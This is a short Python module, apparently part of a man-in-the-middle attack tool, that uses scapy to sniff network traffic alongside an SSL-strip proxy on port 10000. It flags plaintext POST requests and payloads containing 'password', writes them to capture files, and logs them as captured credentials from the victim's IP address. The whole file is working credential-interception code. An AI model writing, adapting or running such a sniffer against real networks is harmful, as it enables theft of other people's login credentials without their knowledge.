import scapy.all as scapy
import uuid
import time
from . import STATUS, STOP_EVENT, CAPTURE_DIR
from .utils import log_msg

def packet_callback(packet):
    if STOP_EVENT.is_set(): return
    
    if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP):
        try:
            payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            
            # --- FILTER FIX: Ignore SSL Strip Proxy Traffic ---
            # If the source or destination port is our proxy port, ignore to avoid double logs
            if packet[scapy.TCP].sport == 10000 or packet[scapy.TCP].dport == 10000:
                return 

            is_sensitive = "POST " in payload or "password" in payload
            if is_sensitive:
                pkt_id = str(uuid.uuid4())
                src = packet[scapy.IP].src
                
                with open(f"{CAPTURE_DIR}/{pkt_id}.html", "w", encoding="utf-8") as f: f.write(payload)
                
                STATUS["intercepted_data"].append({
                    "id": pkt_id, "time": time.strftime('%H:%M:%S'),
                    "src": src, "dst": packet[scapy.IP].dst,
                    "snippet": f"[SECRET] {payload[:80]}", "type": "ALERT"
                })
                log_msg(f"[ALERT] Creds captured from {src}")
        except: pass

def start_sniffer():
    scapy.sniff(iface=STATUS["interface"], store=0, prn=packet_callback)